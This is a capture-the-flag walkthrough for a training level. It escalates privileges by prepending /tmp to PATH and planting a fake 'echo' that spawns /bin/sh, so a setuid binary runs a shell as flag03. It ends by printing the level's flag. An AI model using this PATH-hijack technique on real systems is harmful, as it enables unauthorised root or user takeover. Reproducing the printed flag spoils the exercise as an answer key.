# level03

It is possible to run almost any executable with elevated privileges in this exercise, I chose sh as it permits pretty much anything

1. get level03.c  (from an external device)

```sh
scp -P 4242 level03@<host>:level03.c level02.c
```

2. Decompile binary, see that it runs as flag03

```shell
/opt/retdec/bin/retdec-decompiler.py level03
```

3. Exploit env vars usage by changing $PATH

```shell
PATH=/tmp:$PATH
```

4. Create an exploit binary to be executed by the original binary

```shell
echo /bin/sh > /tmp/echo
```

```shell
chmod +x /tmp/echo
```

5. Execute the original binary and retrieve flag

```shell
./level03
```

6. (optional) prove that we operate as flag03

```shell
whoami
```

7. pwn the flag

```shell
getflag
```

gives flag: `qi0maab88jeaj46qoumi7maus`
